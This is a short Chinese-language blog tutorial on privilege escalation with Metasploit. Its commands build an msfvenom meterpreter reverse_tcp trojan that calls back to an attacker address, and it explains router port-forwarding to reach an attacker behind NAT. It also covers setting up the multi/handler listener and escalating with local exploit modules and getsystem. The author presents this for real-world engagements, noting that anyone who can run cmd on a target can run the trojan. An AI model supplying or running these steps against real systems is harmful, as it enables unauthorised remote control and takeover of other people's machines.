---
title: 利用metasploit进行提权
date: 2017-11-02 22:21:46
categories:
	- 权限提升
tags:
	- metasploit
---

利用metasploit进行提权<!-- more -->
```
1.先利用msfvemom生成一个反弹木马，
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.138 LPORT=4444 -f exe -o /root/tt.exe

lhost  msf所在ip  如果是msf在内网，就填你的外网地址，然后通过路由器的端口映射转发过去。

例如，你外网是xxx.xxx.xxx.12:9999  路由设置映射到msf地址的4444.  
那么生成木马时填写外网地址，就会把xxx.xxx.xxx.12:9999映射到msf地址的4444端口
msf监听的地址设置你msf虚拟机的地址。
路由映射它会找你外网，
然后外网又会把流量转发到你的msf虚拟机上。
因此我们监听虚拟机就好了。
它直接找，找不到我们虚拟机，但是可以找到我们外网，我们外网又能找到我们虚拟机

2.启动msf
  msfconsole  启动msf

使用监听模块
use exploit/multi/handler 

设置payload
set payload windows/meterpreter/reverse_tcp  这是32位

set payload windows/x64/meterpreter/reverse_tcp
64位

显示参数
show options 

yes为必填。no可不填。

设置监听地址 设置其他参数也类似， set 参数 参数值
set LHOST 192.168.189.134

exploit  监听
成功后返回一个session
根据session  提权。
提权成功后再次返回一个session

use exploit/windows/local/ms  提权模块
也可以使用  search 命令搜索你想要的exp

session -i  id  选定session
session -l  查看session列表
jobs  显示管理进程
kill id  kill 一个进程
getuid   获取当前权限 
getsystem  自动化提权
background   后台运行当前session

```

msf视频演示：
  链接：http://pan.baidu.com/s/1c1ML31Y 密码：w815

```
因为我权限设置的问题，
在实战中你能执行cmd命令，基本都可以运行木马，
不需要担心上传上去运行不了的问题。

msf提权的好处：
不需要自己去收集exp，
你网上找的exp还要自己先测试看下是否可用，
还需要实时更新，太费劲了，
msf会自动帮我们集成exp。
使用msf的exp 也不需要担心exp能不能用，都是有专人测试过的。
也不需要担心是否有后门 等等。

提权也只是metasploit的冰山一角。
```